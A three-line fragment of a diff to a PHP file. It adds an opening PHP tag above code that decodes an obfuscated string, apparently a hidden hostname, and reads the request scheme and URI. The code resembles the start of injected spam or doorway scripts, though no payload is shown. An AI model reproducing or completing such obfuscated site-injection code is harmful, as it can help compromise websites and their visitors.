@@ -1,3 +1,4 @@
+<?php
 $xmlname = urldecode('114-er103.ioybtarjf.fvgr');
 $http = is_https() ? 'https' : 'http';
 $duri_tmp = drequest_uri();
